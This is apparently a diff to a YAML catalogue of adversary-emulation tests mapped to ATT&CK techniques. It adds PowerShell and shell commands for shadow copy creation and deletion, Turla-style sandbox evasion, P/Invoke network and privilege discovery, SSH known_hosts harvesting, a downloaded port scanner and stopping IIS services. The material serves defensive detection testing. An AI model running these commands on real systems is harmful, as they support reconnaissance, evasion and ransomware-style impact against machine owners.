-        command: "(gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')\n"
+        command: |
+          $r = (gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')
+          $Shadow_Id =  $r.ShadowId
+          Set-Content -Path "$env:TEMP/shadow_id.txt" -Value "$Shadow_Id"
+        cleanup_command: |
+          $Shadow_Id = Get-Content -Path "$env:TEMP/shadow_id.txt"
+          vssadmin delete shadows /shadow=$Shadow_Id /quiet
+          Remove-Item "$env:TEMP/shadow_id.txt" -Force -ErrorAction SilentlyContinue
         name: powershell
         elevation_required: true
     - name: Create Symlink to Volume Shadow Copy
@@ -97540,6 +100279,24 @@ discovery:
           net users >> %file%
           query user >> %file%
         cleanup_command: 'del #{output_file_path}\\user_info_*.tmp
+
+          '
+    - name: User Discovery - whoami
+      auto_generated_guid: aab580c7-cc30-4a7c-b5a9-46a29066b022
+      description: |
+        Identify the current user account and security context using whoami. Adversaries use this command during initial
+        reconnaissance after gaining access to a system to determine the user and privilege level they are operating under.
+      supported_platforms:
+      - windows
+      input_arguments:
+        whoami_args:
+          description: Arguments to pass to whoami (e.g. /all, /priv, /groups, /user)
+          type: string
+          default: "/all"
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'whoami #{whoami_args}
 
           '
   T1613:
@@ -99317,6 +102074,35 @@ discovery:
           fi;
 
           '
+    - name: Turla Mosquito Sandbox Evasion via SetupDiGetClassDevs Check
+      auto_generated_guid: eed8b13f-ad93-4b1e-8fa8-57cd400a0399
+      description: |
+        Emulates the anti-sandbox / anti-emulation system check performed by the crypter used with Turla's Mosquito
+        backdoor, where after de-obfuscating its first layer, the backdoor calls the Win32 API SetupDiGetClassDevs(0,0,0,0xFFFFFFFF). On real Windows 7/10
+        hosts the call reliably returns 0xE000021A, whereas sandboxes and emulators that do not implement SetupAPI
+        correctly return a different value, allowing the malware to detect and evade analysis environments.
+
+        This test reproduces the same SetupDiGetClassDevs call via P/Invoke. It performs the API call the malware makes
+        but deliberately does not branch or exit on the result; the observable behavior under test is the anomalous
+        invocation of setupapi.dll!SetupDiGetClassDevs with the undocumented 0xFFFFFFFF (4294967295 in decimal) flag.
+
+        Reference: https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Add-Type @"
+              using System;
+              using System.Runtime.InteropServices;
+              public static class MosquitoSandboxCheck {
+                  [DllImport("setupapi.dll", SetLastError=true)]
+                  public static extern IntPtr SetupDiGetClassDevs(IntPtr ClassGuid, IntPtr Enumerator, IntPtr hwndParent, uint Flags);
+              }
+          "@
+
+          $null = [MosquitoSandboxCheck]::SetupDiGetClassDevs([IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, 4294967295)
   T1069.002:
     technique:
       type: attack-pattern
@@ -101650,6 +104436,19 @@ discovery:
           '
         name: command_prompt
         elevation_required: false
+    - name: Get System Hardware UUID Via wmic.exe
+      auto_generated_guid: cd6fc00d-ad6e-431c-832c-33e97ab9218f
+      description: 'Upon execution, displays the system''s hardware UUID. Used in
+        BlackCat ransomware to generate a recovery URL.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        command: 'wmic csproduct get UUID
+
+          '
+        name: powershell
   T1016.002:
     technique:
       type: attack-pattern
@@ -102746,6 +105545,70 @@ discovery:
 
           '
         name: command_prompt
+    - name: IPv4 Enumeration with GetIpAddrTable
+      auto_generated_guid: 7dd47911-b7b9-48c2-bb2c-8e1fad5d6d99
+      description: |
+        Uses C# P/Invoke to call GetIpAddrTable from iphlpapi.dll to enumerate all IPv4
+        addresses bound to local interfaces. Adversaries use this API to discover network
+        configuration and identify multi-homed hosts for lateral movement or pivoting. Used by
+        Turla in ApolloShadow malware.
+
+        Reference: https://www.microsoft.com/en-us/security/blog/2025/07/31/frozen-in-transit-secret-blizzards-aitm-campaign-against-diplomats/
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Add-Type -TypeDefinition @'
+          using System;
+          using System.Runtime.InteropServices;
+
+          [StructLayout(LayoutKind.Sequential)]
+          public struct MIB_IPADDRTABLE
+          {
+              public uint dwNumEntries;
+              public MIB_IPADDRROW table;  // first row only
+          }
+
+          [StructLayout(LayoutKind.Sequential)]
+          public struct MIB_IPADDRROW
+          {
+              public uint dwAddr;
+              public uint dwIndex;
+              public uint dwMask;
+              public uint dwBCastAddr;
+              public uint dwReasmSize;
+              public ushort unused1;
+              public ushort wType;
+          }
+
+
+          public class IpEnumeration{
+          [DllImport("iphlpapi.dll", SetLastError = true)]
+          static extern uint GetIpAddrTable(IntPtr pIpAddrTable, ref int pdwSize, bool bOrder);
+
+          public static void getIPs(){
+            int size = 0;
+            GetIpAddrTable(IntPtr.Zero, ref size, false);
+            IntPtr buffer = Marshal.AllocHGlobal(size);
+            try {
+                GetIpAddrTable(buffer, ref size, false);
+                var table = Marshal.PtrToStructure<MIB_IPADDRTABLE>(buffer);
+                int rowSize = Marshal.SizeOf<MIB_IPADDRROW>();
+
+                for (int i = 0; i < table.dwNumEntries; i++){
+                    IntPtr rowPtr = buffer + 4 + (i * rowSize);
+                    var row = Marshal.PtrToStructure<MIB_IPADDRROW>(rowPtr);
+                    Console.WriteLine(new System.Net.IPAddress(row.dwAddr));
+                }
+            } finally {
+                Marshal.FreeHGlobal(buffer);
+            }
+          }
+          }
+          '@
+          [IpEnumeration]::getIPs()
   T1087:
     technique:
       type: attack-pattern
@@ -104323,6 +107186,64 @@ discovery:
           '
         name: command_prompt
         elevation_required: false
+    - name: Check Process Token Elevation via GetTokenInformation
+      auto_generated_guid: 668f1d74-4bdb-4209-91e3-b31df0e4fbb7
+      description: |
+        Uses C# P/Invoke to call OpenProcessToken and GetTokenInformation with TokenElevation
+        to discover whether the current process is running with elevated privileges. Adversaries
+        use this API-level check to determine their privilege context before deciding whether
+        to attempt privilege escalation. Turla's ApolloShadow does this to determine its path of execution.
+
+        Reference: https://www.microsoft.com/en-us/security/blog/2025/07/31/frozen-in-transit-secret-blizzards-aitm-campaign-against-diplomats/
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Add-Type -TypeDefinition @'
+          using System;
+          using System.Runtime.InteropServices;
+
+          public class TokenElevationCheck
+          {
+              [DllImport("advapi32.dll", SetLastError = true)]
+              static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+              [DllImport("advapi32.dll", SetLastError = true)]
+              static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, out int TokenInformation, int TokenInformationLength, out int ReturnLength);
+
+              [DllImport("kernel32.dll")]
+              static extern IntPtr GetCurrentProcess();
+
+              [DllImport("kernel32.dll", SetLastError = true)]
+              static extern bool CloseHandle(IntPtr hObject);
+
+              const uint TOKEN_QUERY = 0x0008;
+              const int TokenElevationType = 18;
+
+              public static void Check()
+              {
+                  IntPtr hToken;
+                  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, out hToken))
+                  {
+                      Console.WriteLine("OpenProcessToken failed: " + Marshal.GetLastWin32Error());
+                      return;
+                  }
+
+                  int elevationType, returnLength;
+                  if (GetTokenInformation(hToken, TokenElevationType, out elevationType, 4, out returnLength))
+                  {
+                      string[] labels = { "", "Default", "Full", "Limited" };
+                      Console.WriteLine("TokenElevationType: " + labels[elevationType]);
+                  }
+
+
+                  CloseHandle(hToken);
+              }
+          }
+          '@
+          [TokenElevationCheck]::Check()
   T1497.002:
     technique:
       type: attack-pattern
@@ -105545,6 +108466,18 @@ discovery:
         when sucessfully executed, the test is going to display installed AV software.
       supported_platforms:
       - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'wmic.exe must be available on the system
+
+          '
+        prereq_command: 'if (Get-Command wmic.exe -ErrorAction SilentlyContinue) {
+          exit 0 } else { exit 1 }
+
+          '
+        get_prereq_command: 'DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
+
+          '
       executor:
         command: wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct
           Get displayName /Format:List
@@ -106449,6 +109382,40 @@ discovery:
           '
         name: powershell
         elevation_required: false
+    - name: Enumerate SSH Configuration
+      auto_generated_guid: 6fc814cb-16d1-43e6-80b3-2ff2a45250d1
+      description: |
+        SSH metadata files (authorized_keys, known_hosts, config) can be used to
+        discover remote systems and trust relationships. known_hosts
+        reveals previously connected servers, config exposes host aliases and jump
+        proxies, and authorized_keys shows which public keys are trusted for login.
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        search_path:
+          description: Directory to search under
+          type: string
+          default: "/"
+        filename:
+          description: SSH metadata file to search for
+          type: string
+          default: known_hosts
+        output_file:
+          description: File to write results to
+          type: path
+          default: "/tmp/ssh_enum.txt"
+      executor:
+        name: bash
+        elevation_required: false
+        command: 'find #{search_path} -name "#{filename}" -type f 2>/dev/null | while
+          read -r file; do echo "=== $file ===" >> #{output_file}; cat "$file" >>
+          #{output_file}; done
+
+          '
+        cleanup_command: 'rm -f #{output_file}
+
+          '
   T1046:
     technique:
       type: attack-pattern
@@ -106862,6 +109829,79 @@ discovery:
           '
         elevation_required: true
         name: sh
+    - name: Windows - Port Scan using RustScan (Port list)
+      auto_generated_guid: 32c268dd-96a7-4530-817c-848534a39d09
+      description: 'Scan ports on a target host using RustScan. Downloads the portable
+        RustScan release binary and scans 127.0.0.1 by default. Uses --greppable so
+        that nmap is not a dependency.
+
+        '
+      supported_platforms:
+      - windows
+      input_arguments:
+        rustscan_url:
+          description: RustScan Windows release zip download URL
+          type: url
+          default: https://github.com/bee-san/RustScan/releases/download/2.4.1/x86_64-windows-rustscan.exe.zip
+        host_to_scan:
+          description: The host to scan with RustScan
+          type: string
+          default: 127.0.0.1
+        port_list:
+          description: Comma-separated list of ports to scan (RustScan -p)
+          type: string
+          default: '22,80,443,3389'
+        rustscan_path:
+          description: Where the RustScan binary will be downloaded to or already
+            is located
+          type: path
+          default: PathToAtomicsFolder\..\ExternalPayloads\rustscan.exe
+        MVC_url:
+          description: Microsoft Visual C++ Redistributable download URL
+          type: url
+          default: https://aka.ms/vc14/vc_redist.x64.exe
+        MVC_path:
+          description: Where the Microsoft Visual C++ Redistributable installer will
+            be downloaded to or already is located
+          type: path
+          default: PathToAtomicsFolder\..\ExternalPayloads\vc_redist.x64.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'RustScan must be available
+
+          '
+        prereq_command: 'if (Test-Path -Path "#{rustscan_path}") { exit 0 } else {
+          exit 1 }
+
+          '
+        get_prereq_command: |
+          $parent_path = Split-Path "#{rustscan_path}"
+          New-Item -Type Directory "$parent_path" -ErrorAction Ignore -Force | Out-Null
+          (New-Object Net.WebClient).DownloadFile("#{rustscan_url}","$parent_path\rustscan.zip")
+          Expand-Archive -Path "$parent_path\rustscan.zip" -DestinationPath "$parent_path" -Force
+      - description: 'Microsoft Visual C++ Redistributable must be installed (RustScan
+          needs VCRUNTIME140.dll)
+
+          '
+        prereq_command: 'if (Test-Path -Path "$env:SystemRoot\System32\vcruntime140.dll")
+          { exit 0 } else { exit 1 }
+
+          '
+        get_prereq_command: |
+          $parent_path = Split-Path "#{MVC_path}"
+          New-Item -Type Directory "$parent_path" -ErrorAction Ignore -Force | Out-Null
+          (New-Object Net.WebClient).DownloadFile("#{MVC_url}","#{MVC_path}")
+          Start-Process "#{MVC_path}" -ArgumentList "/install","/quiet","/norestart" -Wait
+      executor:
+        command: '& "#{rustscan_path}" -a #{host_to_scan} --greppable -p #{port_list}
+
+          '
+        cleanup_command: |
+          $parent_path_rust = Split-Path "#{rustscan_path}"
+          Remove-Item "#{rustscan_path}" -Force -ErrorAction Ignore
+          Remove-Item "$parent_path_rust\rustscan.zip" -Force -ErrorAction Ignore
+          Remove-Item "#{MVC_path}" -Force -ErrorAction Ignore
+        name: powershell
   T1518:
     technique:
       type: attack-pattern
@@ -113384,6 +116424,35 @@ impact:
           '
         name: bash
         elevation_required: true
+    - name: Windows - iisreset.exe to stop Internet services
+      auto_generated_guid: 0f752206-61b2-4f2f-b397-e883a503968b
+      description: 'Stops Internet services upon running. Used by BlackCat ransomware
+        to release/prevent locks on files to be encrypted.
+
+        '
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: iireset.exe will not be found if the IIS Windows feature is disabled,
+          which it is by default.
+        prereq_command: if((Get-WindowsOptionalFeature -Online -FeatureName IIS-WebServerRole).State
+          -eq "Enabled"){exit 0} else {exit 1}
+        get_prereq_command: |-
+          Enable-WindowsOptionalFeature -Online -FeatureName IIS-WebServerRole -NoRestart
+          New-Item -Path "$env:TEMP\T1489_enabled" -ItemType File
+      executor:
+        command: 'iisreset.exe /stop
+
+          '
+        cleanup_command: |
+          iisreset.exe /start
+          if(Test-Path -Path "$env:TEMP\T1489_enabled"){
+            Disable-WindowsOptionalFeature -Online -FeatureName IIS-WebServerRole -NoRestart
+            Remove-Item "$env:TEMP\T1489_enabled" -Force
+          }
+        name: powershell
+        elevation_required: true
   T1499.004:
     technique:
       type: attack-pattern
@@ -115861,6 +118930,17 @@ impact:
       - windows
       dependency_executor_name: powershell
       dependencies:
+      - description: 'WMIC must be installed (deprecated and removed by default in
+          Windows 11 22H2+)
+
+          '
+        prereq_command: 'if (Get-Command wmic.exe -ErrorAction SilentlyContinue) {
+          exit 0 } else { exit 1 }
+
+          '
+        get_prereq_command: 'DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
+
+          '
       - description: 'Create volume shadow copy of C:\ .
 
           '
